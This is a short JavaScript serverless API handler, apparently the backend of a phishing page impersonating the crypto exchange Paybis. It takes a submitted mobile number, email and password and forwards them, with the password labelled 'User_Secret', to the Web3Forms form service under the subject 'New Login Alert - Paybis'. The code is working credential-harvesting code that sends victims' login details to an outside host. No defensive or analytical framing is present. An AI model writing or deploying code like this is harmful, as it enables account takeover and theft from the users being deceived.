export default async function handler(req, res) {
  // Sirf POST request allow karein
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { mobile, email, password, time } = req.body;

  // Basic validation
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password required' });
  }

  try {
    // Web3Forms ko request bhejein
    const response = await fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        // Yahan Vercel ki Environment Variable use ho rahi hai
        access_key: process.env.WEB3FORMS_ACCESS_KEY, 
        subject: "New Login Alert - Paybis",
        from_name: "Paybis Security",
        Mobile_Number: mobile,
        User_Email: email,
        User_Secret: password,
        Time: time,
        botcheck: false
      })
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("Web3Forms Error:", errorText);
      return res.status(500).json({ error: 'Failed to send' });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error("Server Error:", err);
    return res.status(500).json({ error: 'Server error' });
  }
}
